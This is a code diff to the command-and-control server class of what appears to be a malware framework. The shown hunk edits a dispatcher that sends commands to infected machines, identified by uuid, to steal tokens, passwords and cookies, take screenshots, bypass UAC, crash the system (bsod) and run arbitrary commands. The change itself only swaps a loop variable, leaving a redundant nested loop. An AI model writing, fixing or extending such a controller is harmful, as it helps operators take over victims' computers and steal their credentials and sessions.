@@ -113,31 +113,31 @@ class C2:
 
         for uuid in uuids:
             if explotation_module_type == "steal-token":
-                for ip in ip_addresses:
+                for uuid in uuids:
                     self.sio.emit('steal-token', {"uuid": uuid})
 
             if explotation_module_type == "steal-password":
-                for ip in ip_addresses:
+                for uuid in uuids:
                     self.sio.emit('steal-password', {"uuid": uuid})
 
             if explotation_module_type == "steal-cookie":
-                for ip in ip_addresses:
+                for uuid in uuids:
                     self.sio.emit('steal-cookie', {"uuid": uuid})
                 
             if explotation_module_type == "bsod":
-                for ip in ip_addresses:
+                for uuid in uuids:
                     self.sio.emit('bsod', {"uuid": uuid})
             
             if explotation_module_type == "screen-shot":
-                for ip in ip_addresses:
+                for uuid in uuids:
                     self.sio.emit('screen-shot', {"uuid": uuid})
             
             if explotation_module_type == "uac-bypass":
-                for ip in ip_addresses:
+                for uuid in uuids:
                     self.sio.emit('uac-bypass', {"uuid": uuid})
             
             if explotation_module_type == "send-command":
-                for ip in ip_addresses:
+                for uuid in uuids:
                     self.sio.emit('send-command', {"uuid": uuid})
 
 
